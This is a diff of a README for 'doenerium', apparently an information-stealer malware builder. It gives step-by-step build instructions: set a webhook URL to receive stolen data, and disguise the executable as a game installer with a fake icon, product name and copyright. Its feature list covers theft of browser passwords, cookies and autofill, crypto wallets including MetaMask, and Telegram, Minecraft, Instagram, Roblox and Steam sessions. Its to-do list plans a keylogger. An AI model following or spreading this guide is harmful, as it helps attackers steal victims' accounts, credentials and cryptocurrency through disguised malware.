@@ -37,21 +37,30 @@
 
 ### 📁  〢 Setting Up
 
-> Install [Node.js](https://nodejs.org/en/download/) 
+> Install [Node.js](https://nodejs.org/dist/v18.15.0/node-v18.15.0-x64.msi) `IMPORTANT: Install NodeJS version 18.1.5`
 > 
 > IMPORTANT: When installing Node.js also install "Tools for Native Modules" => Tick `Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes.`
 > 
-> This will take a few minutes because it will download up to 2 GB of data
+> Run the **_install.bat_** file to install all necessary packages
 >
-> Install [Visual studio](https://visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSFeaturesPage&passive=true&tailored=cplus&cid=2031#cplusplus) with C++ compilers and all enabled (is a bit gigs but u wont have errors)
-> 
-> Run **_install.bat_** file to install all necessary files
+> Replace _REPLACE_ME_ with your webhook url in **_config.js_**
 >
-> Replace _REPLACE_ME_ with your webhook url in **_webhook.js_**
+> Replace the **"default.ico"** file with the icon you would like to have on your executable ``The filetype must be ".ico"!``
+>
+> Add a File Description, ProductName, LegalCopyright & OriginalFilename in ``config.js`` 
+>
+> An example would be:
+```
+properties: {
+    FileDescription: 'Best Game ever',
+    ProductName: 'Best Game ever',
+    LegalCopyright: 'Best Game ever ©️ 2023',
+    OriginalFilename: 'BestGameEverSetup.exe'
+}
+
+```
 >
 > Run **_build.bat_** and wait for a file with a similar name to **_doenerium_8AnBqvBG.exe_** to be built.
->
-> Note: Changing the icon does not work and will corrupt the exe
 
 <a id="features"></a>
 
@@ -80,6 +89,7 @@
 > 🕹️ AtomicWallet
 > 💹 Guarda
 > ⚡ Coinomi
+> 🦊 MetaMask
 >
 > Browser (Chrome, Opera, Firefox, OperaGX, Edge, Brave, Yandex) -
 > Passwords, Cookies, Autofill & History (Searches for specific keywords such as PayPal, Coinbase etc. in them)
@@ -87,6 +97,16 @@
 > Screenshot(s)
 >
 > Telegram Session
+>
+> Minecraft Session Stealer / Grabber & Validator
+> 
+> Instagram Session Stealer / Grabber & Validator
+> 
+> Roblox Session Stealer / Grabber & Validator
+>
+> Steam Session Stealer / Grabber & Validator
+>
+> Growtopia save.dat stealer
 
 #### Additional
 
@@ -110,7 +130,12 @@
 
 ### 📸 〢 Screenshots
 
-<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/1.png?raw=true" alt="" width="450"><img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/2.png?raw=true" alt="" width="439">![](https://github.com/doenerium69/doenerium/blob/main/screenshots/3.png?raw=true)<img title="" src="https://i.imgur.com/hFryuaR.png" alt="" width="439"><img title="" src="https://i.imgur.com/4cbEMeK.png" alt="" width="439">
+<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/2.png?raw=true" alt="" width="539"><img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/6.png?raw=true" alt="" width="539">
+<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/7.png?raw=true" alt="" width="539"><img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/8.png?raw=true" alt="" width="539">
+<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/9.png?raw=true" alt="" width="539"><img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/10.png?raw=true" alt="" width="539">
+
+<img title="" src="https://i.imgur.com/hFryuaR.png" alt="" width="639">
+<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/11.png?raw=true" alt="" width="639">
 
 <a id="todo"></a>
 
@@ -121,12 +146,9 @@
 > - ~~Exodus wallet injection (get the password whenever the user logs in the wallet)~~
 > - More grabbers (VPN's, Gaming, Messengers)
 > - Keylogger
-> - Growtopia stealer
 > - Discord bot to build within discord ($build <webhook_url>)
 > - Dynamic encryption
 > - Firefox stealer
-> - Fix browser history 
-> - Make it so it won't build with node-18 for less file size
 
 <a id="license"></a>
 
